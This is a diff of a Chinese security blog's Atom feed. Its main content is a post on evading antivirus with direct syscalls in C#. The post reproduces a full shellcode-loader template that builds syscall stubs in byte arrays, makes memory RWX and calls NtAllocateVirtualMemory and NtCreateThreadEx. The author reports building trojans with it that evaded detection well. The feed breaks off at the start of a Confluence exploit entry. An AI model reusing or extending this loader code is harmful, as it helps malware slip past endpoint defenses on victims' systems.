@@ -3,11 +3,11 @@
   <title>九世的博客</title>
   
   
-  <link href="http://422926799.github.io/atom.xml" rel="self"/>
+  <link href="http://jiushill.github.io/atom.xml" rel="self"/>
   
-  <link href="http://422926799.github.io/"/>
-  <updated>2022-11-21T19:35:44.143Z</updated>
-  <id>http://422926799.github.io/</id>
+  <link href="http://jiushill.github.io/"/>
+  <updated>2022-11-21T19:39:10.621Z</updated>
+  <id>http://jiushill.github.io/</id>
   
   <author>
     <name>九世</name>
@@ -18,10 +18,10 @@
   
   <entry>
     <title>C# syscall免杀</title>
-    <link href="http://422926799.github.io/posts/78d2031e.html"/>
-    <id>http://422926799.github.io/posts/78d2031e.html</id>
+    <link href="http://jiushill.github.io/posts/78d2031e.html"/>
+    <id>http://jiushill.github.io/posts/78d2031e.html</id>
     <published>2022-11-21T19:02:36.000Z</published>
-    <updated>2022-11-21T19:35:44.143Z</updated>
+    <updated>2022-11-21T19:39:10.621Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了两个项目，大多数笔记都更新在星球了。想起来，很久没写博客了，更新一下<br>最近研究了一下C#的syscall，记录一下<br><img src="https://s1.ax1x.com/2022/11/22/zlo3od.png" alt=""></p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote><p>抄来的介绍</p></blockquote><p>在Windows中，进程架构分为两种处理器访问模式——用户模式和内核模式。这些模式的实现背后的想法是保护用户应用程序不访问和修改任何关键的操作系统数据。Chrome、Word 等用户应用程序都运行在用户模式下，而操作系统代码（如系统服务和设备驱动程序）都运行在内核模式下。<br><img src="https://s1.ax1x.com/2022/11/22/zloJJI.png" alt=""></p><p>内核模式特指处理器中的一种执行模式，它授予对所有系统内存和所有 CPU 指令的访问权限。一些 x86 和 x64处理器通过使用另一个称为环级别的术语来区分这些模式。利用环级别特权模式的处理器定义了四个特权级别 - 其他称为环- 以保护系统代码和数据。这些振铃级别的示例如下所示。<br><img src="https://s1.ax1x.com/2022/11/22/zloNSP.png" alt=""></p><p>在 Windows 中，Windows 仅使用其中两个环 - 内核模式的环 0 和用户模式的环 3。现在，在正常的处理器操作期间，处理器将根据处理器上运行的代码类型在这两种模式之间切换。那么，这种“环级”安全性背后的原因是什么？那么，当您启动用户模式应用程序时，Windows 将为该应用程序创建一个新进程，并为该应用程序提供一个私有虚拟地址空间和一个私有句柄表。 这个“句柄表”是一个包含句柄的内核对象。句柄只是对特定系统资源的抽象引用值，例如内存区域或位置、打开的文件或管道。它的最初目标是对 API 用户隐藏真实的内存地址，从而允许系统执行某些管理功能，例如重组物理内存。 总体而言，handles 作业是针对任务内部结构的，例如：令牌、进程、线程等。下面可以看到一个句柄的示例。<br><img src="https://s1.ax1x.com/2022/11/22/zloUQf.png" alt=""></p><p>因为应用程序的虚拟地址空间是私有的，所以一个应用程序不能更改属于另一个应用程序的数据——除非进程通过文件映射或通过VirtualProtect函数将其私有地址空间的一部分作为共享内存部分提供，或者除非一个进程有权打开另一个进程以使用跨进程内存功能，例如<strong>ReadProcessMemory</strong>和<strong>WriteProcessMemory</strong>。<br><img src="https://s1.ax1x.com/2022/11/22/zloay8.png" alt=""></p><p>现在，与用户模式不同，在内核模式下运行的所有代码共享一个称为系统空间的虚拟地址空间。这意味着内核模式驱动程序不与其他驱动程序和操作系统本身隔离。因此，如果驱动程序不小心写入了错误的地址空间或进行了恶意操作，那么它可能会危及系统或其他驱动程序。尽管有一些保护措施可以防止操作系统受到干扰——比如内核补丁保护又名补丁保护，但我们不必担心这些。【由于内核容纳了操作系统的大部分内部数据结构（例如句柄表），任何时候用户模式应用程序需要访问这些数据结构或需要调用内部 Windows 例程来执行特权操作（例如读取一个文件），那么它必须首先<strong>从用户模式切换到内核模式。这就是系统调用发挥作用的地方</strong>。 为了让用户应用程序在内核模式下访问这些数据结构，该进程使用了一个特殊的处理器指令触发器，称为“系统调用”。该指令触发处理器访问模式之间的转换，并允许处理器访问内核中的系统服务调度代码。】这反过来调用Ntoskrnl.exe或Win32k.sys中的适当内部函数，这些函数包含内核和 OS 应用程序级逻辑。</p><p>问题：<br>1.不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><h2 id="如何获取syscall的系统调用号"><a href="#如何获取syscall的系统调用号" class="headerlink" title="如何获取syscall的系统调用号"></a>如何获取syscall的系统调用号</h2><p>准备工具：windbg<br>获取API地址</p><pre><code>x ntdll!NtCreateFile</code></pre><p>指定地址查看反汇编</p><pre><code>u 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zlo0eg.png" alt=""></p><p>得到的汇编</p><pre><code>ntdll!ZwCreateFile:00007ffd`3826db50 4c8bd1          mov     r10,rcx00007ffd`3826db53 b855000000      mov     eax,55h00007ffd`3826db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],100007ffd`3826db60 7503            jne     ntdll!ZwCreateFile+0x15 (00007ffd`3826db65)00007ffd`3826db62 0f05            syscall00007ffd`3826db64 c3              ret00007ffd`3826db65 cd2e            int     2Eh00007ffd`3826db67 c3              ret</code></pre><p>其中这里的<strong>mov eax,55h</strong>就是系统调用号，这里的NtCreateFile的系统调用号就是<strong>0x55</strong>。将系统调用号传入eax寄存器，将调用系统调用指令。CPU 将在此处跳转到内核模式并执行指定的特权操作。<br>这里可以看到关键的汇编指令：<br>(参数会传到r10，r10在传给rcx)</p><pre><code>mov r10,rcx //规定mov eax,&lt;系统调用号&gt;syscallret</code></pre><p>获取API函数需要的内存权限</p><pre><code>!address 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloBwQ.png" alt=""></p><h2 id="C-下如何编写"><a href="#C-下如何编写" class="headerlink" title="C#下如何编写"></a>C#下如何编写</h2><p>代码示例来源：<a href="https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall</a></p><p>整体代码思路：<br>-&gt;先把提取出来的系统编号那段汇编放到byte[]数组<br>-&gt;定义一个函数实现委托<br>-&gt;定义byte指针，将汇编的byte[]数组赋予该指针<br>-&gt;定义名为memoryAddress的int变量，将byte指针赋予<br>-&gt;利用VirtualProtectEx修改内存权限<br>-&gt;利用Marshal.GetDelegateForFunctionPointer将函数转换为一个委托<br>-&gt;返回该委托</p><p>问题：<br>为什么要用unsafe<br>为什么要用Marshal.GetDelegateForFunctionPointer<br>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><p>为什么要用unsafe</p><pre><code>当一个代码块使用 unsafe 修饰符标记时，C# 允许在函数中使用指针变量。不安全代码或非托管代码是指使用了指针变量的代码块</code></pre><p>为什么要有Marshal.GetDelegateForFunctionPointer</p><pre><code>在.net 2.0 中，框架直接提供了 Marshal.GetDelegateForFunctionPointer 来转换一个函数指针为一个委托C# 中的委托（Delegate）类似于 C 或 C++ 中函数的指针。委托（Delegate） 是存有对某个方法的引用的一种引用类型变量。引用可在运行时被改变。委托（Delegate）特别用于实现事件和回调方法。所有的委托（Delegate）都派生自 System.Delegate 类。参考链接：https://cloud.tencent.com/developer/article/1798625https://www.runoob.com/csharp/csharp-delegate.html</code></pre><p>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><pre><code>UnmanagedFunctionPointer控制作为非托管函数指针传递给非托管代码或从非托管代码传递的委托签名的封送处理行为。这个类不能被继承。https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.unmanagedfunctionpointerattribute.-ctor?view=net-6.0#system-runtime-interopservices-unmanagedfunctionpointerattribute-ctor(system-runtime-interopservices-callingconvention)CallingConvention.StdCal 被调用者清理堆栈。属于调用约定枚举里面的参数https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.callingconvention?view=net-6.0</code></pre><p><strong>写死的syscall示例代码1</strong></p><pre><code class="csharp">static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }public struct Delegates        {                    &lt;省略&gt;            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);</code></pre><p><strong>示例代码2</strong></p><pre><code class="csharp">using System;using System.ComponentModel;using System.Diagnostics;using System.Runtime.InteropServices;using static Syscall.Native;namespace Syscall{    class Syscalls    {        /*        MSDN:        NTSTATUS NtAllocateVirtualMemory(            HANDLE ProcessHandle,         // C#: IntPtr            PVOID* BaseAddress,           // C#: IntPtr            ULONG_PTR ZeroBits,           // C#: IntPtr            PSIZE_T RegionSize,           // C#: ref UIntPtr            ULONG AllocationType,         // C#: UInt32            ULONG Protect                 // C#: UInt32            );        ReactOS:        NTSTATUS NtAllocateVirtualMemory(            _In_ HANDLE ProcessHandle,            _Inout_ _Outptr_result_buffer_(* RegionSize) PVOID *BaseAddress,            _In_ ULONG_PTR ZeroBits,            _Inout_ PSIZE_T RegionSize,            _In_ ULONG AllocationType,            _In_ ULONG Protect            ); */        /*   0x18 in all Windows 10 version so far   */        static byte[] bNtAllocateVirtualMemory =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x18, 0x00, 0x00, 0x00,   // mov eax,18h            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtAllocateVirtualMemory(            IntPtr ProcessHandle,            ref IntPtr BaseAddress,            IntPtr ZeroBits,            ref UIntPtr RegionSize,            uint AllocationType,            uint Protect )        {            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall            byte[] syscall = bNtAllocateVirtualMemory;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtAllocateVirtualMemory                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));                    return (NTSTATUS)assembledFunction(                        ProcessHandle,                        ref BaseAddress,                        ZeroBits,                        ref RegionSize,                        AllocationType,                        Protect);                }            }        }        // https://securityxploded.com/ntcreatethreadex.php        //NTSTATUS NtCreateThreadEx(            // OUT PHANDLE hThread,                         // C#: out IntPtr            // IN ACCESS_MASK DesiredAccess,                // C#: ACCESS_MASK (Native.cs)            // IN LPVOID ObjectAttributes,                  // C#: IntPtr.Zero            // IN HANDLE ProcessHandle,                     // C#: IntPtr            // IN LPTHREAD_START_ROUTINE lpStartAddress,    // C#: IntPtr            // IN LPVOID lpParameter,                       // C#: IntPtr            // IN BOOL CreateSuspended,                     // C#: Boolean/Int            // IN ULONG StackZeroBits,                      // C#: uint            // IN ULONG SizeOfStackCommit,                  // C#: uint            // IN ULONG SizeOfStackReserve,                 // C#: uint            // OUT LPVOID lpBytesBuffer                     // C#: IntPtr            // );        /*   Windows 10 1909: 0xBD, Windows 10 2004: 0xC1   */        static byte[] bNtCreateThreadEx =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx        //    0xb8, 0xc1, 0x00, 0x00, 0x00,   // mov eax,0BDh            0xb8, 0xbd, 0x00, 0x00, 0x00,   // mov eax,0BDh            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtCreateThreadEx(            out IntPtr hThread,            ACCESS_MASK DesiredAccess,            IntPtr ObjectAttributes,            IntPtr ProcessHandle,            IntPtr lpStartAddress,            IntPtr lpParameter,            bool CreateSuspended,            uint StackZeroBits,            uint SizeOfStackCommit,            uint SizeOfStackReserve,            IntPtr lpBytesBuffer            )        {            // set byte array of bNtCreateThread to new byte array called syscall            byte[] syscall = bNtCreateThreadEx;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtCreateThread                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));                    return (NTSTATUS)assembledFunction(                        out hThread,                        DesiredAccess,                        ObjectAttributes,                        ProcessHandle,                        lpStartAddress,                        lpParameter,                        CreateSuspended,                        StackZeroBits,                        SizeOfStackCommit,                        SizeOfStackReserve,                        lpBytesBuffer                        );                }            }        }        /*        MSDN:        NTSTATUS ZwWaitForSingleObject(            HANDLE Handle,             // C#: IntPtr            BOOLEAN Alertable,         // C#: Boolean            PLARGE_INTEGER Timeout     // C#: Int64            );        ReactOS:        NTSTATUS NtWaitForSingleObject(             In_ HANDLE Object,             In_ BOOLEAN Alertable,             In_opt_ PLARGE_INTEGER Time             ); */        /*   0x4 in all Windows 10 versions so far   */        static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }        public struct Delegates        {            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtAllocateVirtualMemory(                IntPtr ProcessHandle,                ref IntPtr BaseAddress,                IntPtr ZeroBits,                ref UIntPtr RegionSize,                ulong AllocationType,                ulong Protect);            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtCreateThreadEx(                out IntPtr hThread,                ACCESS_MASK DesiredAccess,                IntPtr ObjectAttributes,                IntPtr ProcessHandle,                IntPtr lpStartAddress,                IntPtr lpParameter,                bool CreateSuspended,                uint StackZeroBits,                uint SizeOfStackCommit,                uint SizeOfStackReserve,                IntPtr lpBytesBuffer                );            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);        }    }}</code></pre><p>NtAllocateVirtualMemory示例代码<br>不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><pre><code class="csharp">       public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID)); //先获取SyscallID的内存大小 再分配内存                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID)); //用0填充内存                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;); //获取ntdll基址                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName); //获取API函数地址                     IntPtr CallAddr = FunAddr + 4; //获取系统调用编号地址                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp); //读取内存编号                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem); //从非托管内存中读取 32 位有符号整数。支持从未对齐的内存位置读取 (相当于转成int)                     return SyscallID; //返回内存编号        }             public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,          // 0x4c, 0x8b, 0xd1=mov r10,rcx、 0xb8=mov eax            0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,   // 0x0F, 0x05=syscall、0xc3=ret            0x0F, 0x05,                                0xC3                                   };public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray(); //拼接syscall汇编指令                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloDoj.png" alt=""></p><p>API Syscall声明-执行shellcode整套完整模板  - 来源代码：<a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p><pre><code class="csharp">using System;using System.Collections.Generic;using System.Linq;using System.Runtime.InteropServices;using System.Text;using System.Threading.Tasks;using System.Runtime.InteropServices;using System.ComponentModel;using System.Diagnostics;namespace SysCall_ShellcodeLoad{    class Auto_NativeCode    {              [DllImport(&quot;kernel32.dll&quot;)]              public static extern bool VirtualProtectEx              (                     IntPtr hProcess,                     IntPtr lpAddress,                     UIntPtr dwSize,                     uint flNewProtect,                     out uint lpflOldProtect               );              [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true,  SetLastError = true)]              static extern IntPtr GetProcAddress(IntPtr hModule, string  procName);              [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]              public static extern IntPtr GetModuleHandle(string lpModuleName);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              public static extern IntPtr GetCurrentProcess();              [DllImport(&quot;kernel32.dll&quot;)]              public static extern void RtlZeroMemory(IntPtr pBuffer, int length);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              static extern bool ReadProcessMemory(                     IntPtr hProcess,                     IntPtr lpBaseAddress,                     IntPtr lpBuffer,                     int dwSize,                     out uint lpNumberOfBytesRead              );              public uint NTSTATUS;              public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;              // public uint SYSid = 0;              public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,                           0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,              0x0F, 0x05,                                0xC3                                   };              public enum AllocationType : ulong              {                     Commit = 0x1000,                     Reserve = 0x2000,                     Decommit = 0x4000,                     Release = 0x8000,                     Reset = 0x80000,                     Physical = 0x400000,                     TopDown = 0x100000,                     WriteWatch = 0x200000,                     LargePages = 0x20000000              }              public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID));                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID));                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;);                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName);                     IntPtr CallAddr = FunAddr + 4;                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp);                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem);                     Console.WriteLine(&quot;SyscallID:{0:x}&quot;,SyscallID);                     return SyscallID;        }              public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }              public static uint NtCreateThreadEx           (                  out IntPtr hThread,                  uint DesiredAccess,                  IntPtr ObjectAttributes,                  IntPtr ProcessHandle,                  IntPtr lpStartAddress,                  IntPtr lpParameter,                  bool CreateSuspended,                  uint StackZeroBits,                  uint SizeOfStackCommit,                  uint SizeOfStackReserve,                  IntPtr lpBytesBuffer           )              {                     // set byte array of bNtCreateThread to new byte array called  syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtCreateThreadEx&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtCreateThread                                  DelegatesStruct.NtCreateThreadEx  assembledFunction =  (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));                                  return (uint)assembledFunction(                                         out hThread,                                         DesiredAccess,                                         ObjectAttributes,                                         ProcessHandle,                                         lpStartAddress,                                         lpParameter,                                         CreateSuspended,                                         StackZeroBits,                                         SizeOfStackCommit,                                         SizeOfStackReserve,                                         lpBytesBuffer                                   );                           }                     }              }              public static uint NtWaitForSingleObject(IntPtr Object, bool  Alertable, uint Timeout)              {                     // set byte array of bNtWaitForSingleObject to new byte array  called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtWaitForSingleObject&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtWaitForSingleObject                                  DelegatesStruct.NtWaitForSingleObject  assembledFunction =  (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));                                  return (uint)assembledFunction(Object,  Alertable, Timeout);                           }                     }              }              public struct DelegatesStruct              {                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtAllocateVirtualMemory(                           IntPtr ProcessHandle,                           ref IntPtr BaseAddress,                           IntPtr ZeroBits,                           ref UIntPtr RegionSize,                           ulong AllocationType,                           ulong Protect);                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtCreateThreadEx(                           out IntPtr hThread,                           uint DesiredAccess,                           IntPtr ObjectAttributes,                           IntPtr ProcessHandle,                           IntPtr lpStartAddress,                           IntPtr lpParameter,                           bool CreateSuspended,                           uint StackZeroBits,                           uint SizeOfStackCommit,                           uint SizeOfStackReserve,                           IntPtr lpBytesBuffer                           );                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtWaitForSingleObject(IntPtr Object,  bool Alertable, uint Timeout);              }       }}</code></pre><p>最后就是实现shellcode执行，按照C翻译就行。或者CV<br><img src="https://s1.ax1x.com/2022/11/22/zlo6Wq.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/11/22/zlogS0.png" alt=""></p><p>在项目里面用这个模板做的几个马，免杀效果都不错<br><img src="https://s1.ax1x.com/2022/11/22/zlo2lV.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-1/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-1/</a><br><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-2/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-2/</a><br><a href="https://www.solomonsklash.io/syscalls-for-shellcode-injection.html" target="_blank" rel="noopener">https://www.solomonsklash.io/syscalls-for-shellcode-injection.html</a><br><a href="https://github.com/SolomonSklash/SyscallPOC" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC</a><br><a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p>]]></content>
     
@@ -34,14 +34,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>CVE-2022-26134 Confluence OGNL RCE 漏洞复现</title>
-    <link href="http://422926799.github.io/posts/9c6a5f14.html"/>
-    <id>http://422926799.github.io/posts/9c6a5f14.html</id>
